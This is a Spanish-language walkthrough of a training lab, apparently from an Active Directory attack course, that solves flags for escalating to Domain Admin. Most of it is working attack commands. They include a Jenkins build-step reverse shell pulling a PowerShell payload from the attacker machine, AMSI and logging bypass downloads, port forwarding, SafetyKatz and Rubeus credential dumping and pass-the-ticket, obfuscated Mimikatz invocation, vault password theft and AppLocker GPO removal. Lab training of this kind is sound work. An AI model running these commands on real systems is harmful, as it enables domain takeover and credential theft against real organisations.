## Tareas
- [ ]  Identifique una maquina en el dominio de destino donde haya una sesión de administrador de dominio disponible
- [ ] Comprometer la maquina y elevar privilegios a Administrador de dominio abusando de una reverse shell en dcorp-ci
- [ ] Escalar privilegios a Domain Admin abusando de la administración local derivada a través de dcorp-adminsrv. En dcorp-adminsrv listar la lista de permisos de la aplicaion
	- [ ] Lagunas en las reglas de Applocker
	- [ ] Deshabilitar Applocker modificando la GPO aplicable

**Flag 10: Proceso que usa svcadmin como cuenta de servicio en dcorp-mgmt**
**Flag 11: Hash NTL de la cuenta scvadmin en dcorp-mgmt**
**Flag 12: Intentamos extraer credenciales en texto plano para tareas programas el valor de la flag es similar a lsass, registry, credential vault, etc**
**Flag 13: Hash NTLM de srvadmin extraído de dcorp-adminsrv**
**Flag 14: Hash NTLM de websvc extraído de dcorp-adminsrv**
**Flag 15: Hash NTLM de appadmin extraído de dcorp-adminsrv**


## Solución 1, Identificar una maquina en el dominio destino donde haya una sesión de administrador disponible
Primero deberemos de ejecutar *InviShell* para poder eludir las detecciones de PowerShell y poder ejecutar este de forma mas sigilosa
```shell
.\InviShell\RunWithRegistryNonAdmin.bat  
```

Y después podremos ejecutar *PowerView*
```shell
. .\PowerView.ps1 
```

Verificaremos que la sesión de administrador de dominio esta disponible, para ello primero tendremos que usar *SessionHunter*, primero hay que cargarlo
```shell
. C:\AD\Tools\Invoke-SessionHunter.ps1
```

Enumeraremos los usuarios con la sesión activa y si tenemos acceso a esos usuarios
```shell
Invoke-SessionHunter -NoPortScan -RawResults | select Hostname,UserSession,Access
```
- *-NoPortScan* -> No hacer escaneo de puertos
- *-RawResults* -> Devuelve los datos completos sin formatear
- *select* -> Filtra por los datos introducidos a continuación

Viendo usuarios con el acceso en *True* siendo los tres admin
```shell
dcorp-adminsrv dcorp\appadmin              True
dcorp-adminsrv dcorp\srvadmin              True
dcorp-adminsrv dcorp\websvc                True
```

También los podemos listar de una lista de servidores ya pasada en un archivo de texto
```shell
Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt | select Hostname,UserSession,Access
```
- *-NoPortScan* -> No hacer escaneo de puertos
- *-RawResults* -> Devuelve los datos completos sin formatear
- *-Targets* -> Cargar fichero con una lista de servidores
- *select* -> Filtra por los datos introducidos a continuación

## Solución 2, Comprometer la maquina y elevar privilegios a Administrador de Dominio abusando de una reverse shell en dcorp-ci

Realizaremos los mismos pasos de obtener una Reverse Shell igual que hemos hecho con el [[Laboratorio 05]] aprovechándonos de una vulnerabilidad en Jenkins

Accederemos al servidor de Jenkins que conocemos que se haya en la IP *172.16.3.11:8080*
Nos encontramos que es la versión *2.361.4*, en el panel de People podemos enumerar tres cuentas y antes de hacer fuerza bruta probaremos entre ellas a usar *User as Password* en este caso *builduser::builduser* en el panel de login

Con este usuario se nos permite modificar un proyecto ya existente en la modificación de este, procederemos a acceder a *BuildHistoy* -> *Configure* -> *Build Step*
Una vez en esa zona de configuración cargaremos una reverse shell hacia nuesta maquina de atacante
```shell
powershell iex (iwr -UseBasicParsing http://<attacker_machine>/Invoke-PowershellTcp.ps1);power -Reverse -IPAddress <attacker_machine> -Port 1339
```

Una vez tenemos introducido el reverse shell lo guardaremos y ejecutaremos *netcat* en nuestra maquina de atacante poniéndonos en escucha en el puerto indicado en el payload
```shell
C:\AD\Tools\netcat-win32-1.12\nc64.exe -lvp 1339
```

Ejecutaremos *hsf.exe* y cargaremos *Invoke-PowerShellTcp.ps1*
En Jenkins haremos clic en Buid Now descargándose nuestro *PowerShellTcp* en la maquina victima recibiendo así una conexión en nuestro *Netcat* como el usuario *ciadmin*

Ahora transferiremos al servidor HTTP *hsf.exe* programas como *PowerView, Loader, SafetyKatz y sbloggingbypass* además deberemos de pasarnos el fichero *Amsi-Byp.txt*

Y nos descargaremos los archivos en el siguiente orden
```shell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sbloggingbypass.txt')
```

```shell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')
```

```shell
iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
```

Ahora enumeraremos a todos aquellos usuarios logeados en el dominio y si tienen sesiones activas ver en que maquina esta cada uno
```shell
Find-DomainUserLocation
```

Viendo que hay una sesión de Domain Admin en el servidor *dcorp-mgmt* y nosotros tener los privilegios de administrador local podemos intentar aprovecharnos de esto para movernos lateralmente.
Vamos a probar si nos podemos aprovechar usando *winrs* para poder ejecutar en la maquina una orden la cual nos de el nombre del equipo y usuario
```shell
 winrs -r:dcorp-mgmt cmd /c "set computername && set username"
```

Obtenemos como respuesta el nombre de usuario *ciadmin* y el nombre del equipo *DCORP-MGMT*

Ahora tenemos que extraer las credenciales de el usuario *ciadmin*, para ello tenemos que usar *SafetyKatz* 
Lo primero que tenemos que hacer ya que lo que hemos hecho a sido recibir una sesión a través de una reverse shell y este equipo no poder visualizarle desde muestra maquina de atacante deberemos hacer pivoting y transferir todo tunelizándolo entre dos puertos

Primero cargaremos *Loader* en *dcorp-mgmt* lo descargamos en *dcorp-ci*
```shell
iwr http://172.16.100.97/Loader.exe -OutFile C:\Users\Public\Loader.exe
```

Una vez lo tenemos aquí lo transferiremos a *dcorp-mgmt*
```shell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Ahora volveremos a poder usar *winrs* para poder ejecutarlo en el equipo de *dcorp-mgmt*, en este caso para poder evitar la detección en el dominio haremos un reenvió de puertos
```shell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97"
```

Haciendo que la maquina objetivo escuche en el puerto *8080* y reenvié el trafico al *80* de nuestra maquina atacante

Usamos *$null* para solucionar problemas a la redirección de salida

Para poder ejecutar ahora *SafetyKatz* en *dcorp-mgmt*, lo descargamos y ejecutamos en memoria usando el *Loader*
```shell
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

Dándonos como respuesta las credenciales del *svcadmin* que es Domain Admin además de ser una cuenta de servicio lo cual es muy interesante para nosotros aportándonos las claves *AES256*

A continuación usaremos la técnica de *OverPass-The_Hash* para obtener las credenciales de *svcadmin* 
Tendremos que ejecutar una terminal aparte como Administrador
```shell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

 Este comando lo que hace es a través del *Loader* que tenemos ejecutado en la maquina victima ejecutar *Rubeus* solicitando un *TGT* con un usuario en este caso *svcadmin* y una clave *AES256* con los parámetros */ptt* indicamos que queremos hacer un *Pass-The-Ticket* insertando el *TGT* directamente en la sesión actual, con el parámetro */createonly* crea un proceso *cmd* con credenciales de red aisladas, con */show* muestra la ventana del proceso creado y con */opsec* intenta ser lo mas sigiloso posible

Con *winrs* podremos ejecutar comando en la maquina victima en donde se nos a otorgado la nueva shell y ver que somos el usuario *svcadmin*
```shell
winrs -r:dcorp-dc cmd /c set username
```

## Solución 3, Escalar privilegios a Domain Admin abusando de la administración local derivada a través de *dcorp-adminsrv* y en este listar los permisos de la aplicación

Lo primero que necesitaremos será elevar los privilegios a Domain Admin usando un administrador local derivado
Enumerar en que maquinas tenemos privilegios de administrador local
Para ello usaremos la herramienta *Find-PSRemotingLocalAdminAccess*
Primero la tenemos que cargar y luego ejecutarla
```shell
 . C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

```shell
Find-PSRemotingLocalAdminAccess
```

Vemos que tenemos privilegio de administrador local en la maquina *dcorp-adminsrv*
Nos conectaremos a la maquina
```shell
winrs -r:dcorp-adminsrv cmd
```

A continuación vamos a enumerar los servicios corriendo en esta maquina
```shell
sc query
```

En caso de querer buscar un servicio en concreto como este caso *AppLocker*, utiliza un servicio del que depende llamado *AppIDSvc*
```shell
sc query AppIDSvc
```

Una vez confirmemos que este servicio existe, buscaremos si existe la configuración de *AppLocker*
```shell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

La respuesta nos desvela que este esta configurado, además de mostrarnos las políticas definidas para múltiples tipos de ejecución
Para saber si hay alguna regla/política demasiado permisiva haremos la siguiente enumeración en cada resultado obtenido en la salida anterior
```shell
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2\<ruta>
```

A continuación enumeraremos estas enumerando uno por uno los *GUID*
```shell
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\<ruta>\<GUID>
```

Una ves la enumeremos tenemos que prestar atención a parámetros que pueden hacer que estas sean demasiado permisivas, los parámetros son:
- *UserOrGroupSid = S-1-1-0* -> Aplica a todo el mundo
- *AuthenticatedUsers* -> Aplica a todo el mundo
- *Action="Allow"* -> Regla que permite, suelen ser las mas vulnerables
- *FilePathCondition Path="..."* -> Dependen de rutas, son las mas débiles, si el *path* incluye *`*`* es mas vulnerable aun o si tiene variables peligrosas como *%WINDIR%\** o *%TEMP%\** 
- *FilePublisherCondition* -> Permiten por firma digital siendo muy peligroso si son muy genéricos *`*`* o muy amplio *MICROSOFT CORPORATION* pudiendo abusar de *LOLBins*

Encontramos una regla muy permisiva en
```shell
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SRPV2\Script\06dce67b-934c-454f-a263-2515c8796a5d
```

Ya que es una regla predeterminada que permite a todos ejecutar scripts desde *C:\ProgramFiles*
También podemos enumerar estas detrás de una forma mas clara usando una conexión remota desde nuestro propio equipo, realizaremos la conexion remota usando el siguiente comando que nos otorgara una *PowerShell*
```shell
Enter-PSSession dcorp-adminsrv
```

Podemos enumerar el tipo de lenguaje que usa
```shell
 $ExecutionContext.SessionState.LanguageMode
```
Te muestra el tipo de lenguaje de PowerShell implementado siendo *FullLanguage* -> sin restricciones, *ConstrainedLanguage* -> muy limitado y *NoLanguage* -> casi bloqueado
En esta caso es *ConstrainedLanguage*

Y una vez en la conexión Obtendremos las políticas de *AppLocker* de la maquina
```shell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

Volviendo a ver que cualquier persona puede ejecutar scripts desde *C:\ProgramFiles*
No se nos permite ejecutar scripts usando el origen de puntos *. .\Invoke-Mimi.ps1*, por lo que tendremos que modificar el script e incluir una propia llamada a la función en el propio script

Vamos a crear el nuevo *Invoke-TheKat* le llamaremos de la siguiente forma: *Invoke-TheKatEx-keys-std97.ps1*
Primero tendremos que crear una copia del  *Invoke-TheKat* original y cambiarle el nombre a *Invoke-TheKatEx-keys-std97.ps1*
Una vez le hayamos cambiado el nombre le damos clic derecho y editar, tendremos que sustituir el contenido de las ultimas líneas por:
```shell
$jq = "t";
$hk = "o";
$cr = "k";
$dg = "e";
$z3 = "n";
$y4 = ":";
$fq = ":";
$67 = "e";
$qj = "v";
$27 = "a";
$yt = "s";
$ws = "i";
$h4 = "v";
$li = "e";
$tv = "-";
$2h = "e";
$qx = "l";
$lx = "e";
$l1 = "v";
$68 = "a";
$5d = "t";
$ny = "e";
$25 = " ";
$d9 = "s";
$9z = "e";
$8x = "k";
$r2 = "u";
$6x = "r";
$zq = "l";
$06 = "s";
$td = "a";
$hb = ":";
$gz = ":";
$nx = "e";
$0n = "v";
$qz = "a";
$ct = "s";
$mj = "i";
$ue = "v";
$sf = "e";
$2c = "-";
$9u = "e";
$hp = "k";
$x0 = "e";
$yb = "y";
$r1 = "s";
$Pwn = $jq + $hk + $cr + $dg + $z3 + $y4 + $fq + $67 + $qj + $27 + $yt + $ws + $h4 + $li + $tv + $2h + $qx + $lx + $l1 + $68 + $5d + $ny + $25 + $d9 + $9z + $8x + $r2 + $6x + $zq + $06 + $td + $hb + $gz + $nx + $0n + $qz + $ct + $mj + $ue + $sf + $2c + $9u + $hp + $x0 + $yb + $r1 ;

Invoke-TheKat -Command $Pwn
```

Ahora una vez el archivo modificado lo transferiremos a la maquina victima
```shell
Copy-Item C:\AD\Tools\Invoke-TheKatEx-keys-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Una vez copiado en la maquina victima nos vamos al directorio donde lo hemos copiado en este caso *Program Files* y lo ejecutamos
```shell
.\Invoke-TheKatEx-keys-std97.ps1
```

Encontrando las credenciales de diferentes usuarios como *srvadmin*, *appadmin* y *websvc* en hash *aes256*

También se pueden buscar credenciales en el almacén de credenciales de *Windows*
Vamos a crear el nuevo *Invoke-TheKat* le llamaremos de la siguiente forma: *Invoke-TheKatEx-vault-std97.ps1*
Primero tendremos que crear una copia del  *Invoke-TheKat* original y cambiarle el nombre a *Invoke-TheKatEx-vault-std97.ps1*
Tendremos que modificar el archivo y añadir en la ultima linea
```shell
Invoke-TheKat -Command '"token::evasive-elevate" "vault::cred /patch"'
```

Lo volvemos a copiar en la maquina victima y lo ejecutamos
```shell
Copy-Item C:\AD\Tools\Invoke-TheKatEX-vault-std97.ps1 \\dcorp-adminsrv.dollarcorp.moneycorp.local\c$\'Program Files'
```

Obteniendo como respuesta la contraseña en texto claro del usuario *srvadmin::TheKeyUs3ron@anyMachine!*

Ahora nos ejecutaremos una shell como este usuario
```shell
runas /user:dcorp\srvadmin /netonly cmd
```

Obteniendo una shell como este usuario
Ahora lo que vamos a ver es si este usuario tiene privilegios de Administrador en alguna otra maquina
Nos ejecutaremos primero una *InviShell*
```shell
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

Cargaremos la herramienta de búsqueda de usuarios con privilegios de administrador en otras maquinas
```shell
. C:\AD\Tools\Find-PSRemotingLocalAdminAccess.ps1
```

Y buscamos usuarios con privilegios de administrador al os que tengamos acceso
```shell
Find-PSRemotingLocalAdminAccess -Domain dollarcorp.moneycorp.local -Verbose
```

Encontrando usuarios como *adminsrv* y *mgmt* teniendo como resultado que tenemos acceso como usuario Administrador en *mgmt* como *srvadmin* además ya sabemos que hay una sesión activa en ese host con un usuario *svcadmin*

Ahora vamos a extraer las credenciales de la maquina usando *SafetyKatz* primero tendremos que cargar el archivo *Loader.exe* a *mgmt*
```shell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

Una vez hemos cargado el archivo extraeremos las credenciales usando
```shell
winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe "sekurlsa::Evasive-keys" "exit"
```

Antes de poder ejecutar este comando tendremos que tener abierto el *HSF* y tener cargado en el el *SafetyKatz*

Una vez ejecutemos el comando entrara la ejecución de *SefetyKatz* con las credenciales de los usuarios

### Deshabilitar Applocker modificando la GPO de *adminsrv*
Como hemos enumerado anteriormente el usuario *student97* tiene control total en la política de grupo *AppLocker* pudiendo realizar cambios en la política de grupo y poder deshabilitar esta

Para poder aprovecharnos de esto deberemos irnos a la consola de administración de directivas de grupo, en el panel de administración del servidor -> Agregar roles y características -> Siguiente -> Características -> Administración de directivas de grupo -> Siguiente -> Instalar

Una vez realizados estos pasos deberemos iniciar un proceso como *studen97* el nombre del proceso es *gpmc.msc* esto lo tendremos que hacer en una noma terminal como Administrador
```shell
runas /user:dcorp\student687 /netonly cmd
```

E iniciaremos el Administrador de Políticas de Grupo
```shell
gpmc.msc
```

Dentro de este nos meteremos en Forest: moneycorp.local -> Domains -> dollarcorp.moneycorp.local -> Applocked -> Applocked. Haremos clic derecho sobre este y le daremos a editar.

En la nueva ventana abierta iremos a Expand Policies -> Windows Settings -> Security Settings -> Application Control Policies -> Applocker

Eliminaremos las reglas que se encuentren en *Executable Rules* pudiendo ahora esperar a que se actualice la directiva de grupo o forzar una actualizacion en la maquina *dcorp-adminsrv*
Para forzarlo deberemos de realizarlo de la sigueinte forma, primero conectandonos por *winrs*
```shell
winrs -r:dcorp-adminsrv cmd
```

Y hacer un update de las GPO
```shell
gpupdate /force
```

Ahora copiaremos el *Loader.exe* a la maquina
```shell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe
```

Y haremos el renvio de puertos primero nos conectaremos a la maquina obteniendo una CMD
```shell
winrs -r:dcorp-adminsrv cmd
```

Y haremos el renvio de puertos, deberemos ejecutarlo como administrador
```shell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
```

Y en la maquina victima ejecutar el *SafetyKatz*
```shell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
```

Obteniendo las credenciales podremos ahora desactivar el *Applocker* lo cual no es una acion segura en un entorno controlado como un pentest pero los ciberdelincuentes si que abusan de ello bastante